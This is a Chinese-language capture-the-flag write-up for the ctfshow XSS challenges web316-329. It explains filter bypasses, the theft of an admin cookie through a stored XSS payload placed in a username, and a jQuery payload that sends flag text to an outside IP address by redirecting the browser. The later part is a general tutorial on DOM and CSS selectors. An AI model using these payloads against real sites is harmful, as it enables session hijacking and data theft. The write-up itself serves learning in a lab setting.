web316 -反射性XSS

​ 生成的链接会被点击，如果是我自己访问，带上的cookie是我自己的cookie，而如果是被其他人点击，带上的就是其他人的cookie。在vps上写php文件。

别人点击链接的时候会带上他的cookie，在vps的日志上就可以看见。

XSS语句：

web317 -过滤script

用<body>或者<img>

web318-319过滤了img，用body标签

web320-326 -过滤空格（xss三个字被过滤了，php文件要改个名字）

空格被过滤，可以用/或者tab绕过

只有收件人是admin时可以发件

payload一样

web328

先随便注册一个账户，发现时非管理员，无法查看用户密码。可以注册一个用户名或者密码为xss语句的用户，当管理员访问网页的时候就会弹出管理员的cookie，用管理员的cookie为造身份

web329

这题的cookie会失效，所以不能通过盗取cookie来登录。可以用xss直接盗取flag

方法一

检查发现，隐藏flag部分的类名为layui-table-cell laytable-cell-1-0-1（用户和密码）

  1. document.getElementsByClassName(‘layui-table-cell laytable-cell-1-0-1’)[1].innerHTML 这是一系列 DOM 操作，用于获取网页中特定元素的内容。

  2. document.getElementsByClassName(‘layui-table-cell laytable-cell-1-0-1’) 是一个通过类名查找元素的方法。它查找具有类名 ‘layui-table-cell’ 和 ‘laytable-cell-1-0-1’ 的元素，通常这是一种针对表格单元格的选择。

  3. [1] 表示从匹配的元素列表中选择第二个元素（JavaScript 中的数组索引从 0 开始）。

  4. .innerHTML 用于获取选定元素的 HTML 内容，也就是在这个表格单元格中显示的文本或

  5. innerHTML：从对象的起始位置到终止位置的全部内容,不包括Html标签。
    innerText可替代innerHTML

  6. outerHTML：除了包含innerHTML的全部内容外, 还包含对象标签本身。

方法二：jQuery选择器查找类和获取内容

如上语句查询所有类名为.laytable0cell-1-0-1的内容，并输出值和序号

indexof()方法查询值在字符串中第一次出现的位置。如果未找到该值，则 indexOf() 方法返回 -1。indexOf() 方法区分大小写。

payload
  1. $(‘div.layui-table-cell.laytable-cell-1-0-1’).each(function(index, value) { … });
    这是一个 jQuery 选择器，它查找具有类名 ‘layui-table-cell’、’laytable-cell-1-0-1’ 的
    元素集合，并对每个元素执行一个函数。
  2. .each(function(index, value) { … })
    这是 jQuery 的遍历方法，它会遍历匹配的元素集合，并对每个元素执行包含在函数中的操作。在这里，函数接受两个参数，index 表示当前元素在集合中的索引，value 表示当前元素的引用。
  3. if (value.innerHTML.indexOf(‘ctfshow{‘) > -1) { … }
    这是在遍历中的条件语句，它检查当前元素的内容是否包含字符串 ‘ctfshow{‘。value.innerHTML 表示当前元素的 HTML 内容，.indexOf(‘ctfshow{‘) 用于查找是否包含 ‘ctfshow{‘，如果包含则返回大于 -1 的索引，否则返回 -1。
  4. window.location.href = ‘http://47.120.30.125/‘ + value.innerHTML;
    如果条件满足，即当前元素的内容包含 ‘ctfshow{‘，则执行这一行代码。它会将浏览器的当前位置重定向到一个新的 URL，这个 URL 是 ‘http://120.46.41.173:9023/‘ 加上当前元素的内容。这样就可以在浏览器中打开一个新的页面，新页面的 URL 包含了 ‘ctfshow{‘ 以及其他内容。
  5. 查找条件要求包含ctfshow不包含script，防止只获取到注入的xss语句

方法三：querySelector()方法获取内容

语法

element = document.querySelector(selectors);

参数

selectors：包含一个或多个要匹配的选择器的DOM字符串DOMString。该字符串必须时有效的CSS选择器字符串；如果不是，则引发STNTAX_ERR异常

返回值

表示文档中与指定的一组CSS选择器匹配的第一个元素，一个Element对象。如果没有匹配，则返回null。如果需要与指定选择器匹配的所有元素列表，则应该使用querySelectorAll()

转义特殊字符

如果要匹配的ID不符合CSS语法（比如不恰当使用冒号或空格），则需要用反斜杠将其转义

复杂的选择器

如果一个class属性为”user-panel mian”的div元素<div>(<div class="user-panel main">)内包含一个name属性为”login”的input元素<input>(<input name="login"/>)，应如下选择

常见的CSS选择器
.class .intro 选择所有class=”intro”的元素
#id #firstname 选择所有id=”firstname”的元素
element p 选择所有<p>元素
element.class p.hometown 选择所有class=”hometown”的<p>元素
element,element div,p 选择所有<div>和<p>元素
element element div p 选择<div>元素内的所有<p>元素
element>element div>p 选择所有父级是<div>元素的<p>元素与
element+element div+p 选择所有紧跟在<div>元素后的第一个<p>元素
[attribute] [target] 选择所有带有target属性的元素
:xxx p:xxx 以<p>作为父级元素或者限定元素做选择

其他选择器:CSS 选择器 | 菜鸟教程 (runoob.com)
